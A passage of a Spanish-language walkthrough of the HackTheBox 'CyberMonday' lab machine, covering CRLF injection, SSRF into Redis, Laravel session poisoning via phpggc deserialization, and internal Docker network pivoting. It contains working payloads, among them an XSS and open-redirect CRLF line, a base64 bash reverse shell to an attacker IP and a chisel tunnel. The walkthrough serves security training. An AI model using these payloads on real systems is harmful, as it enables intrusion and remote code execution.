Como vemos en la imagen de arriba, podemos controlar esa parte de la peticion. Cualquier cosa que pongamos se va a ver reflejado ahi. Vamos a intentar con una Inyeccion que se ve mucho en `Bug Bounty` y son las CRLF Injection.

### Inyeccion CRLF  

Puede utilizarse como ataques más maliciosos, como Cross-site Scripting (XSS) , inyección de páginas, envenenamiento de caché web (Cache Poisoning), entre otros. Existe una vulnerabilidad de inyección CRLF si un atacante logra inyectar los caracteres CRLF (\r\n) en una aplicación web, por ejemplo, mediante un formulario de entrada de usuario o una solicitud HTTP.

Al inyectar una secuencia CRLF, el atacante puede dividir la respuesta en dos partes, controlando así la estructura de la respuesta HTTP. Esto puede ocasionar diversos problemas de seguridad, como:

- Cross-Site Scripting (XSS): Inyeccion de scripts maliciosos en la segunda respuesta.
- Envenenamiento de cache: Forzar el almacenamiento de contenido incorrecto en las caches.
- Manipulación de encabezados: Alterar los encabezados para engañar a los usuarios o sistemas.

### PoC CRLF

```bash
http://example.com/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2f%2e%2e

HTTP Response

HTTP/1.1 200 OK
Date: Tue, 20 Dec 2016 14:34:03 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 22907
Connection: close
X-Frame-Options: SAMEORIGIN
Last-Modified: Tue, 20 Dec 2016 11:50:50 GMT
ETag: "842fe-597b-54415a5c97a80"
Vary: Accept-Encoding
X-UA-Compatible: IE=edge
Server: NetDNA-cache/2.2
Link: https://example.com/[INJECTION STARTS HERE]
Content-Length:35
X-XSS-Protection:0

23
<svg onload=alert(document.domain)>
0

```

Tambien se lo puede derivar a un `Open Redirect`

```bash
%0d%0aLocation:%20http://evil.com
```

Pero Volviendo con la maquina, podemos manipular el metodo y tambien las cabezeras por debajo con un retorno de carro seguido de un salto de linea (\r\n) URLencodeado seria `%0d%0a`

![](htb-writeup-cybermonday/cybermonday30.png)

Entonces esta seria mi estrategia:

Usar el SSRF para interactuar con Redis y modificar los datos de sesion de mi usuario para ejecutar un `ataque de deserialización`. Al actualizar la página principal, el código malicioso se deserializará y se ejecutará el código. 

Si observamos bien el archivo `env` que conseguimos cuando dumpeamos con git-dumper todo el proyecto. Logramos captar 2 HOSTS: el de la base de datos y redis, ahora me interesa la de redis, entonces mi SSRF quedaria asi `http://redis:6379`, existe un comando que le puedo lanzar para saber si redis responde correctamente.

![](htb-writeup-cybermonday/cybermonday31.png)

Sin exito, no recibo nada.

### Redis Escritura de Claves

Quiero poder escribir una clave, para poder intentar algo como esto

```bash
POST /webhooks/b311dca2-81b8-433f-8bdb-af720a4cd71f HTTP/1.1
Host: webhooks-api-beta.cybermonday.htb
User-Agent: curl/8.14.1
Accept: */*
Content-Type: application/json
x-access-token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6MiwidXNlcm5hbWUiOiJtcmluY3JlaWJsZSIsInJvbGUiOiJhZG1pbiJ9.CUHScdEV7fyEZAhuChXFhfw-z9r68F9tGW3DqpcT7Xw
Content-Length: 53
Connection: keep-alive

{"url": "http://redis:6379", "method":"\r\nset mrincreiblekey 'key test mrincreible'\r\n"}
```

El reto consiste en saber si funcionó. Para comprobarlo, voy a configurar mi propio servidor Redis en un contenedor Docker, asegurándome de redirigir el puerto 6379 de mi máquina virtual a ese puerto del contenedor: 

```bash
docker run -p 6379:6379 redis
```

Y con el comando `MIGRATE` vamos a migrar esta clave que supuestamente cree `mrincreiblekey` a mi ip de origen

Este comando ejecuta en realidad un DUMP+DEL en la instancia de origen y un RESTORE en la instancia de destino. Eliminara la clave en el servidor actual y lo enviara al mio.

La sintaxis que usaré para MIGRATE es MIGRATE [host] [port] [key] [destination-db] [timeout] COPY REPLACE. 

```bash
POST /webhooks/0249c5c6-f129-4395-98f3-028701edb0cf HTTP/1.1
Host: webhooks-api-beta.cybermonday.htb
User-Agent: curl/8.14.1
Accept: */*
Content-Type: application/json
x-access-token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6MiwidXNlcm5hbWUiOiJtcmluY3JlaWJsZSIsInJvbGUiOiJhZG1pbiJ9.CUHScdEV7fyEZAhuChXFhfw-z9r68F9tGW3DqpcT7Xw
Content-Length: 107
Connection: keep-alive

{"url": "http://redis:6379", "method":"\r\nMIGRATE 10.10.14.2 6379 mrincreiblekey 0 5000 COPY REPLACE\r\n"}
```

Veamos si responde el cambio de keys

```bash
redis-cli
127.0.0.1:6379> keys * # Al principio no veiamos nada
(empty array)          # Ninguna Key
127.0.0.1:6379> keys * # Luego de ejecutar el comando MIGRATE, funciono correctamente.
1) "mrincreiblekey"
127.0.0.1:6379> get mrincreiblekey # Ya puedo ver la key que cree
"key test mrincreible"
127.0.0.1:6379>
```

Esto quiere decir que puedo `ESCRIBIR CLAVES` en Redis!!!.. Una vez logrado esto, para conseguir un ataque de deserializacion y ejecutar comandos necesito desencriptar mi cookie de session de la web `cybermonday.htb/home`.

Laravel almacena los datos de sesión en Redis bajo la clave con el formato como [prefix][sessionid]. Tengo el prefijo laravel_session: en el .env solo necesito obtener el ID de sesión de la cookie.

Si buscamos en HackTricks y filtramos por [laravel decrypt cookie](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/laravel.html?highlight=laravel#decrypt-cookie) se van a encontra con un script en python que tenemos que modificar alguna cosas para su correcto funcionamiento.

```python
import os
import json
import hashlib
import sys
import hmac
import base64
import string
import requests
from Crypto.Cipher import AES
from phpserialize import loads, dumps

#https://gist.github.com/bluetechy/5580fab27510906711a2775f3c4f5ce3

def mcrypt_decrypt(value, iv):
    global key
    AES.key_size = [len(key)]
    crypt_object = AES.new(key=key, mode=AES.MODE_CBC, IV=iv)
    return crypt_object.decrypt(value)


def mcrypt_encrypt(value, iv):
    global key
    AES.key_size = [len(key)]
    crypt_object = AES.new(key=key, mode=AES.MODE_CBC, IV=iv)
    return crypt_object.encrypt(value)


def decrypt(bstring):
    global key
    dic = json.loads(base64.b64decode(bstring).decode())
    mac = dic['mac']
    value = bytes(dic['value'], 'utf-8')
    iv = bytes(dic['iv'], 'utf-8')
    if mac == hmac.new(key, iv+value, hashlib.sha256).hexdigest():
        return mcrypt_decrypt(base64.b64decode(value), base64.b64decode(iv))
        #return loads(mcrypt_decrypt(base64.b64decode(value), base64.b64decode(iv))).decode()
    return ''


def encrypt(string):
    global key
    iv = os.urandom(16)
    #string = dumps(string)
    padding = 16 - len(string) % 16
    string += bytes(chr(padding) * padding, 'utf-8')
    value = base64.b64encode(mcrypt_encrypt(string, iv))
    iv = base64.b64encode(iv)
    mac = hmac.new(key, iv+value, hashlib.sha256).hexdigest()
    dic = {'iv': iv.decode(), 'value': value.decode(), 'mac': mac}
    return base64.b64encode(bytes(json.dumps(dic), 'utf-8'))

app_key ='EX3zUxJkzEAY2xM4pbOfYMJus+bjx6V25Wnas+rFMzA=' # En esta parte se remplaza por la APP_KEY del .env
key = base64.b64decode(app_key)
print(decrypt('eyJpdiI6IkRjazU5T3NTZW5RZDhGMkNFZmROcHc9PSIsInZhbHVlIjoiUnlOeDNGUEkwMnMyTTE5dElQNUd0c3Q0YmlwcnM2R2ZFUGllQVp6Zng3WnlWNGZNMFRObDNva05GODY0bVRZL1VFdFNROC9mZ3FqQzMvZ0NWV0tkbEc2cnJEakU2KzdtOEhTN1p0eGVrRWFVSDhURUhwdWNVYWtCWGlpL0pnMGYiLCJtYWMiOiI0ODk3OWVhNThkNmY0MjUwNTczNmZmYWQ1NGE1NTk3NWU1YThmYmQ0MWYwYTY0ZDlhNzlhMzFiNTU5OTQ1ZWU1IiwidGFnIjoiIn0=')) 
```
borramos lo de abajo y agregamos print, dentro de decrypt colocamos la cookie de `cybermonday_session`.. este lo encontramos en la web real donde estan los articulos de compra.

```bash
python3 decrypt.py
b'25c6a7ecd50b519b7758877cdc95726f29500d4c|3iTCz5eTWHMWE9Znf9V3OXcfF6SumYUAtOCddoib\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f'
```

Nos devuelve ese output, lo que necesitamos es lo que sigue depues del |

```bash
3iTCz5eTWHMWE9Znf9V3OXcfF6SumYUAtOCddoib
```

Con la ID de sesion mas la clave del .env puede intentar envenenar los datos de sesion.

```bash
POST /webhooks/0249c5c6-f129-4395-98f3-028701edb0cf HTTP/1.1
Host: webhooks-api-beta.cybermonday.htb
User-Agent: curl/8.14.1
Accept: */*
Content-Type: application/json
x-access-token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6MiwidXNlcm5hbWUiOiJtcmluY3JlaWJsZSIsInJvbGUiOiJhZG1pbiJ9.CUHScdEV7fyEZAhuChXFhfw-z9r68F9tGW3DqpcT7Xw
Content-Length: 107
Connection: keep-alive

{
	"url": "http://redis:6379", 
	"method":"\r\nset laravel_session:3iTCz5eTWHMWE9Znf9V3OXcfF6SumYUAtOCddoib mrincreible\r\n
	MIGRATE 10.10.14.2 6379 laravel_session:3iTCz5eTWHMWE9Znf9V3OXcfF6SumYUAtOCddoib 0 5000 COPY REPLACE\r\n"
}
```

Y me devuelde esto

```bash
127.0.0.1:6379> keys *
1) "laravel_session:aVdJXHkGrKhXnD3fAFMWvnxf99ePahRRmi35KWXA"
127.0.0.1:6379> get laravel_session:aVdJXHkGrKhXnD3fAFMWvnxf99ePahRRmi35KWXA
"mrincreible"
```

Esto es una buena señal, pero ahora voy a probar tambien con actualizar la pagina `cybermonday.htb/home`.

![](htb-writeup-cybermonday/cybermonday32.png)

Llama a `unserialize()` y se crashea la web, esto significa que pasandole un carga correcta podemos realizar el `ataque de deserializacion`.

Tenemos que elegir uno acorde a la version.

### Deserialization Attack (RCE)

```bash
phpggc -l | grep "Laravel"
Laravel/RCE1                              5.4.27                                                  RCE (Function call)    __destruct          
Laravel/RCE2                              5.4.0 <= 8.6.9+                                         RCE (Function call)    __destruct          
Laravel/RCE3                              5.5.0 <= 5.8.35                                         RCE (Function call)    __destruct     *    
Laravel/RCE4                              5.4.0 <= 8.6.9+                                         RCE (Function call)    __destruct          
Laravel/RCE5                              5.8.30                                                  RCE (PHP code)         __destruct     *    
Laravel/RCE6                              5.5.* <= 5.8.35                                         RCE (PHP code)         __destruct     *    
Laravel/RCE7                              ? <= 8.16.1                                             RCE (Function call)    __destruct     *    
Laravel/RCE8                              7.0.0 <= 8.6.9+                                         RCE (Function call)    __destruct     *    
Laravel/RCE9                              5.4.0 <= 9.1.8+                                         RCE (Function call)    __destruct          
Laravel/RCE10                             5.6.0 <= 9.1.8+                                         RCE (Function call)    __toString          
Laravel/RCE11                             5.4.0 <= 9.1.8+                                         RCE (Function call)    __destruct          
Laravel/RCE12                             5.8.35, 7.0.0, 9.3.10                                   RCE (Function call)    __destruct     *    
Laravel/RCE13                             5.3.0 <= 9.5.1+                                         RCE (Function call)    __destruct     *    
Laravel/RCE14                             5.3.0 <= 9.5.1+                                         RCE (Function call)    __destruct          
Laravel/RCE15                             5.5.0 <= v9.5.1+                                        RCE (Function call)    __destruct          
Laravel/RCE16                             5.6.0 <= v9.5.1+                                        RCE (Function call)    __destruct
```

```bash
phpggc Laravel/RCE10 system "ping -c 1 10.10.14.3"
O:38:"Illuminate\Validation\Rules\RequiredIf":1:{s:9:"condition";a:2:{i:0;O:28:"Illuminate\Auth\RequestGuard":3:{s:8:"callback";s:14:"call_user_func";s:7:"request";s:6:"system";s:8:"provider";s:20:"ping -c 1 10.10.14.3";}i:1;s:4:"user";}}
```

Me devuelve la carga serializada, este parece estar en lo correcto.

Lo siguiente es acoplarlo a mi burp y escapar algunas comillas y barras.

```bash
POST /webhooks/2037b4ca-25e5-4aae-b0b5-236086dfce2c HTTP/1.1
Host: webhooks-api-beta.cybermonday.htb
User-Agent: curl/8.14.1
Accept: */*
Content-Type: application/json
x-access-token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6MiwidXNlcm5hbWUiOiJtcmluY3JlaWJsZSIsInJvbGUiOiJhZG1pbiJ9.CUHScdEV7fyEZAhuChXFhfw-z9r68F9tGW3DqpcT7Xw
Content-Length: 225
Connection: keep-alive

{
	"url": "http://redis:6379", 
	"method":"\r\nset laravel_session:aVdJXHkGrKhXnD3fAFMWvnxf99ePahRRmi35KWXA 
	'O:38:\"Illuminate\\Validation\\Rules\\RequiredIf\":1:{s:9:\"condition\";a
	:2:{i:0;O:28:\"Illuminate\\Auth\\RequestGuard\":3:{s:8:\"callback\";s:14:\"
	call_user_func\";s:7:\"request\";s:6:\"system\";s:8:\"provider\";s:2:\"ping
	 -c 1 10.10.14.3\";}i:1;s:4:\"user\";}}'\r\nMIGRATE 10.10.14.3 6379 laravel
	_session:aVdJXHkGrKhXnD3fAFMWvnxf99ePahRRmi35KWXA 0 5000 COPY REPLACE\r\n"
}
```

Nuestro payload tendria que quedar de esta manera, escapamos las comilla dobles y tambien las barras. Este comando ejecutara un `ping` a mi maquina mientras este escuchando con tcpdump.

![](htb-writeup-cybermonday/cybermonday33.png)

Si corroboramos la clave en redis.

![](htb-writeup-cybermonday/cybermonday34.png)

Conseguimos que nuestra clave valga esa carga serializada, ahora vamos a recargar la pagina y ver si se ejecuta nuestro comando.

PERO! no pudimos realizar un ping. No nos funciono, `quizas porque sea un contenedor donde no este instalado el ping`.

Vamos a intentar ejecutar el comando `id`.

![](htb-writeup-cybermonday/cybermonday35.png)

Este si logro ejecutarse pero despues redirecciona al panel de login y esa cookie ya no funciona, hay volver a loguearse y ejecutar un reverse shell.

```bash
echo 'bash -c "bash -i >& /dev/tcp/10.10.14.3/443 0>&1"' | base64
```

Este es mi oneliner codificado en base64.

```bash
phpggc Laravel/RCE10 system 'echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zLzQ0MyAwPiYxIgo=|base64 -d|bash'

O:38:"Illuminate\Validation\Rules\RequiredIf":1:{s:9:"condition";a:2:{i:0;O:28:"Illuminate\Auth\RequestGuard":3:{s:8:"callback";s:14:"call_user_func";s:7:"request";s:6:"system";s:8:"provider";s:88:"echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zLzQ0MyAwPiYxIgo=|base64 -d|bash";}i:1;s:4:"user";}}
```

De esta carga serializada solo tenemos que remplazar el s:2 a s:88 y el comando.

```bash
POST /webhooks/2037b4ca-25e5-4aae-b0b5-236086dfce2c HTTP/1.1
Host: webhooks-api-beta.cybermonday.htb
User-Agent: curl/8.14.1
Accept: */*
Content-Type: application/json
x-access-token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6MiwidXNlcm5hbWUiOiJtcmluY3JlaWJsZSIsInJvbGUiOiJhZG1pbiJ9.CUHScdEV7fyEZAhuChXFhfw-z9r68F9tGW3DqpcT7Xw
Content-Length: 462
Connection: keep-alive

{
	"url": "http://redis:6379",
	"method":"\r\nset laravel_session:SI1ILeRLsR4DcstG308UhRXbBvl1Z3POSsyh5KeT 
	'O:38:\"Illuminate\\Validation\\Rules\\RequiredIf\":1:{s:9:\"condition\";a
	:2:{i:0;O:28:\"Illuminate\\Auth\\RequestGuard\":3:{s:8:\"callback\";s:14:\"
	call_user_func\";s:7:\"request\";s:6:\"system\";s:8:\"provider\";s:88:\"echo
	 YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zLzQ0MyAwPiYxIgo=|base64
	 -d|bash\";}i:1;s:4:\"user\";}}'\r\nMIGRATE 10.10.14.3 6379 laravel_session:
	SI1ILeRLsR4DcstG308UhRXbBvl1Z3POSsyh5KeT 0 5000 COPY REPLACE\r\n"
}
```

Este es mi carga final para conseguir una shell en la maquina.

![](htb-writeup-cybermonday/cybermonday36.png)

Conseguimos la shell!!!!!... Si llegaste hasta este punto quiero decir que sos un MASTER!!!! Todavia queda mucho para pwnear la maquina... Pero animos!

## Escalada de privilegios

### Shell www-data (Enumeracion de Red)

```bash
www-data@070370e2cdc4:~$ ping -c 1 10.10.14.3
bash: ping: command not found
```

Es como predecimos, no tenemos instaldo el ping en este contenedor. Nuestro punto de inicio es este `172.18.0.7`... nuestra ip termina en 7.

Puede ser que hayan otros hosts y contendedores.

```bash
www-data@070370e2cdc4:~$ cat /proc/net/fib_trie
Main:
  +-- 0.0.0.0/0 3 0 5
     |-- 0.0.0.0
        /0 universe UNICAST
     +-- 127.0.0.0/8 2 0 2
        +-- 127.0.0.0/31 1 0 0
           |-- 127.0.0.0
              /32 link BROADCAST
              /8 host LOCAL
           |-- 127.0.0.1
              /32 host LOCAL
        |-- 127.255.255.255
           /32 link BROADCAST
     +-- 172.18.0.0/16 2 0 2
        +-- 172.18.0.0/29 2 0 2
           |-- 172.18.0.0
              /32 link BROADCAST
              /16 link UNICAST
           |-- 172.18.0.7
              /32 host LOCAL
        |-- 172.18.255.255
           /32 link BROADCAST
Local:
  +-- 0.0.0.0/0 3 0 5
     |-- 0.0.0.0
        /0 universe UNICAST
     +-- 127.0.0.0/8 2 0 2
        +-- 127.0.0.0/31 1 0 0
           |-- 127.0.0.0
              /32 link BROADCAST
              /8 host LOCAL
           |-- 127.0.0.1
              /32 host LOCAL
        |-- 127.255.255.255
           /32 link BROADCAST
     +-- 172.18.0.0/16 2 0 2
        +-- 172.18.0.0/29 2 0 2
           |-- 172.18.0.0
              /32 link BROADCAST
              /16 link UNICAST
           |-- 172.18.0.7
              /32 host LOCAL
        |-- 172.18.255.255
           /32 link BROADCAST
```

Lo normal es que docker asigne por defecto la ip 172.18.0.1 al host real y lo demas serian contenedores corriendo servicios como bases de datos, redis, apis, etc.

Si entramos a la carpeta `/mnt` vemos lo siguiente:

```bash
www-data@070370e2cdc4:/$ ls -l /mnt
total 12
-rw-r--r-- 1 root root  701 May 29  2023 changelog.txt
drwxrwxrwx 2 root root 4096 Aug  3  2023 logs
-rw-r----- 1 root 1000   33 Nov 10 12:32 user.txt
```

Este changelog.txt me hace recuerdo al .env que fue el inicio de todo. 

```bash
www-data@070370e2cdc4:/mnt$ ls -la
total 40
drwxr-xr-x 5 1000 1000 4096 Aug  3  2023 .
drwxr-xr-x 1 root root 4096 Jul  3  2023 ..
lrwxrwxrwx 1 root root    9 Jun  4  2023 .bash_history -> /dev/null
-rw-r--r-- 1 1000 1000  220 May 29  2023 .bash_logout
-rw-r--r-- 1 1000 1000 3526 May 29  2023 .bashrc
drwxr-xr-x 3 1000 1000 4096 Aug  3  2023 .local
-rw-r--r-- 1 1000 1000  807 May 29  2023 .profile
drwxr-xr-x 2 1000 1000 4096 Aug  3  2023 .ssh
-rw-r--r-- 1 root root  701 May 29  2023 changelog.txt
drwxrwxrwx 2 root root 4096 Aug  3  2023 logs
-rw-r----- 1 root 1000   33 Nov 10 12:32 user.txt
```

Tenemos una carpeta .ssh con un archivo authorized_keys donde hay una clave publica que termina con john@cybermonday.htb, no podemos hacer nada con esta cable porque necesitamos la privada para conectarnos por SSH.

Vamos a seguir enumerando. Subire el binario compilado de `nmap` para que sea mas comodo enumerar toda la red y servicios.

```bash
www-data@070370e2cdc4:/tmp$ ./nmap 172.18.0.0/24

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2025-11-10 15:40 UTC
Unable to find nmap-services!  Resorting to /etc/services
Unable to open /etc/services for reading service information
QUITTING!
```

Para solucionar este error voy a crear un archivo llamada nmap-services en mi carpeta actual `/tmp`.

```bash
www-data@070370e2cdc4:/tmp$ touch nmap-services
www-data@070370e2cdc4:/tmp$ ./nmap 172.18.0.0/24

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2025-11-10 15:45 UTC
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 172.18.0.1
Host is up (0.00084s latency).
Not shown: 1022 closed ports
PORT   STATE SERVICE
22/tcp open  unknown
80/tcp open  unknown

Nmap scan report for cybermonday_redis_1.cybermonday_default (172.18.0.2)
Host is up (0.0020s latency).
All 1024 scanned ports on cybermonday_redis_1.cybermonday_default (172.18.0.2) are closed

Nmap scan report for cybermonday_nginx_1.cybermonday_default (172.18.0.3)
Host is up (0.0018s latency).
Not shown: 1023 closed ports
PORT   STATE SERVICE
80/tcp open  unknown

Nmap scan report for cybermonday_registry_1.cybermonday_default (172.18.0.4)
Host is up (0.00095s latency).
All 1024 scanned ports on cybermonday_registry_1.cybermonday_default (172.18.0.4) are closed

Nmap scan report for cybermonday_db_1.cybermonday_default (172.18.0.5)
Host is up (0.0015s latency).
All 1024 scanned ports on cybermonday_db_1.cybermonday_default (172.18.0.5) are closed

Nmap scan report for cybermonday_api_1.cybermonday_default (172.18.0.6)
Host is up (0.0018s latency).
Not shown: 1023 closed ports
PORT   STATE SERVICE
80/tcp open  unknown

Nmap scan report for 070370e2cdc4 (172.18.0.7)
Host is up (0.0019s latency).
All 1024 scanned ports on 070370e2cdc4 (172.18.0.7) are closed

Nmap done: 256 IP addresses (7 hosts up) scanned in 17.57 seconds
```

Este escaneo no se ve muy claro, asique vamos a ejecutarlo uno por uno.

```bash
www-data@070370e2cdc4:/tmp$ ./nmap -p- --open --min-rate 10000 172.18.0.2   

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2025-11-10 15:57 UTC
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for cybermonday_redis_1.cybermonday_default (172.18.0.2)
Host is up (0.00100s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE
6379/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 29.47 seconds
www-data@070370e2cdc4:/tmp$ ./nmap -p- --open --min-rate 10000 172.18.0.3

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2025-11-10 15:57 UTC
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for cybermonday_nginx_1.cybermonday_default (172.18.0.3)
Host is up (0.00072s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE
80/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 28.76 seconds
www-data@070370e2cdc4:/tmp$ ./nmap -p- --open --min-rate 10000 172.18.0.4

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2025-11-10 15:58 UTC
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for cybermonday_registry_1.cybermonday_default (172.18.0.4)
Host is up (0.00097s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE
5000/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 28.90 seconds
www-data@070370e2cdc4:/tmp$ ./nmap -p- --open --min-rate 10000 172.18.0.5

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2025-11-10 15:59 UTC
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for cybermonday_db_1.cybermonday_default (172.18.0.5)
Host is up (0.0013s latency).
Not shown: 65533 closed ports
PORT      STATE SERVICE
3306/tcp  open  unknown
33060/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 30.18 seconds
www-data@070370e2cdc4:/tmp$ ./nmap -p- --open --min-rate 10000 172.18.0.6

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2025-11-10 16:01 UTC
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for cybermonday_api_1.cybermonday_default (172.18.0.6)
Host is up (0.0023s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE
80/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 28.69 seconds
www-data@070370e2cdc4:/tmp$ ./nmap -p- --open --min-rate 10000 172.18.0.7

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2025-11-10 16:01 UTC
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 070370e2cdc4 (172.18.0.7)
Host is up (0.00076s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE
9000/tcp open  unknown
```

- cybermonday                                PORTS 22,80    (172.18.0.1)
- cybermonday_redis_1.cybermonday_default    PORTS 6379     (172.18.0.2)
- cybermonday_nginx_1.cybermonday_default    PORTS 80       (172.18.0.3)
- cybermonday_registry_1.cybermonday_default PORTS 5000     (172.18.0.4)
- cybermonday_db_1.cybermonday_default       PORTS 3306     (172.18.0.5)
- cybermonday_api_1.cybermonday_default      PORTS 80       (172.18.0.6)

Muy bien!, Esa es la informacion que recopile de los hosts. Lo nuevo que veo en este escaneo es el puerto `5000 registry`, debe ser algun contenedor que se comunica con docker o quizas sea docker.

Lo que puedo hacer ahora es traerme ese puerto a mi maquina con `chisel` y jugar un poco con `PORT FORDWARDING`.

### Chisel (Port Fordwarding)

```bash
www-data@070370e2cdc4:/tmp$ curl http://10.10.14.3/chisel -o chisel && chmod +x chisel
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 8144k  100 8144k    0     0  1423k      0  0:00:05  0:00:05 --:--:-- 1674k
```

Voy a iniciar el servidor en mi maquina de atacante, donde escuchare por el puerto 1234.

```bash
./chisel server -p 1234 --reverse
2025/11/10 19:18:23 server: Reverse tunnelling enabled
2025/11/10 19:18:23 server: Fingerprint yCaacEYKUFNTvJ6jP7KQ/aZxHNzS0u6mPvzQOSGcu5o=
2025/11/10 19:18:23 server: Listening on http://0.0.0.0:1234
```

Luego desde el contendor voy a conectarme a mi servidor para redireccionar el puerto a mi maquina. Entonces el puerto 5000 de la maquina se convertira en mi puerto tambien.

```bash
www-data@070370e2cdc4:/tmp$ ./chisel client 10.10.14.3:1234 R:5000:172.18.0.4:5000 
2025/11/10 18:21:19 client: Connecting to ws://10.10.14.3:1234
2025/11/10 18:21:20 client: Connected (Latency 165.826978ms)
```

Y de esta manera ya tengo el puerto 5000 corriendo en mi maquina.

Lo siguiente sera investigar mas sobre este puerto.

```bash
sudo nmap -sCV -p5000 127.0.0.1
[sudo] contraseña para mrincreible: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-10 19:23 CET
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000099s latency).

PORT     STATE SERVICE VERSION
5000/tcp open  http    Docker Registry (API: 2.0)
|_http-title: Site doesn't have a title.

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.33 seconds
```

Decidimos realizar un escaneo rapido sobre el servicio que corre en dicho puerto y nos encontramos con un `Docker Registry (API: 2.0)` debe ser los registros que guarda docker sobre los contenedores... Asi que buscando mas informacion sobre este puerto nos encontramos con esto [Docker Registry](https://www.verylazytech.com/docker-registry-port-5000#enumeration)

Nos dice que podemos realizar peticiones a la api con `/v2/_catalog`.

```bash
curl -s "http://127.0.0.1:5000/v2/_catalog" | jq
{
  "repositories": [
    "cybermonday_api"
  ]
}
```

Tenemos un repositorio, podriamos traerlo a nuestro entorno con `docker pull`. Quizas sea un backup de la api de cybermonday o webhooks...

```bash
sudo docker pull localhost:5000/cybermonday_api
Using default tag: latest
latest: Pulling from cybermonday_api
5b5fe70539cd: Pull complete 
affe9439d2a2: Pull complete 
1684de57270e: Pull complete 
dc968f4da64f: Pull complete 
57fbc4474c06: Pull complete 
9f5fbfd5edfc: Pull complete 
5c3b6a1cbf54: Pull complete 
4756652e14e0: Pull complete 
57cdb531a15a: Pull complete 
1696d1b2f2c3: Pull complete 
ca62759c06e1: Pull complete 
ced3ae14b696: Pull complete 
beefd953abbc: Pull complete 
Digest: sha256:72cf91d5233fc1bedc60ce510cd8166ce0b17bd1e9870bbc266bf31aca92ee5d
Status: Downloaded newer image for localhost:5000/cybermonday_api:latest
localhost:5000/cybermonday_api:latest
```

Voy a iniciar este contenedor.

```bash
sudo docker run -d --rm localhost:5000/cybermonday_api
5ca76565013b79e1e072df3e35534ca80a5f69e5e20f593e87f22aff452330d5
```

Puedo conseguir una shell de la siguiente forma.

```bash
sudo docker ps
CONTAINER ID   IMAGE                            COMMAND                  CREATED          STATUS          PORTS                                       NAMES
5ca76565013b   localhost:5000/cybermonday_api   "docker-php-entrypoi…"   19 seconds ago   Up 18 seconds                                               nostalgic_williamson
15f590237037   redis                            "docker-entrypoint.s…"   6 hours ago      Up 6 hours      0.0.0.0:6379->6379/tcp, :::6379->6379/tcp   affectionate_faraday
❯ sudo docker exec -it 5ca76565013b bash
root@5ca76565013b:/var/www/html#
```

Este contenedor esta medio vacio, solo tiene el proyecto de webhooks... pero si inspeccionamos un poco mas a fondo nos encontramos con:

```php
<?php

namespace app\routes;
use app\core\Controller;

class Router
{
    public static function get()
    {
        return [
            "get" => [
                "/" => "IndexController@index",
                "/webhooks" => "WebhooksController@index"
            ],
            "post" => [
                "/auth/register" => "AuthController@register",
                "/auth/login" => "AuthController@login",
                "/webhooks/create" => "WebhooksController@create",
                "/webhooks/:uuid" => "WebhooksController@get",
                "/webhooks/:uuid/logs" => "LogsController@index"
            ],
            "delete" => [
                "/webhooks/delete/:uuid" => "WebhooksController@delete",
            ]
        ];
    }

    public static function run()
    {
        $routerFilter = new RouterFilter();
        $controller = new Controller;

        $route = $routerFilter->simpleRouter();
        if($route)
        {
            return $controller->execute($route);
        }

        $route = $routerFilter->dynamicRouter();
        if($route)
        {
            return $controller->execute($route);
        }

        return http_response_code(404);
    }
}
```

La rutas completas, observamos que aparte de crear tambien se pueden listar mas logs con la `uuid` de cada webhooks que cree. Esta parte nos lleva a leer el codigo de LogsController.php.

### LogsController.php

```php
<?php

namespace app\controllers;
use app\helpers\Api;
use app\models\Webhook;

class LogsController extends Api
{
    public function index($request)
    {
        $this->apiKeyAuth();

        $webhook = new Webhook;
        $webhook_find = $webhook->find("uuid", $request->uuid);

        if(!$webhook_find)
        {
            return $this->response(["status" => "error", "message" => "Webhook not found"], 404);
        }

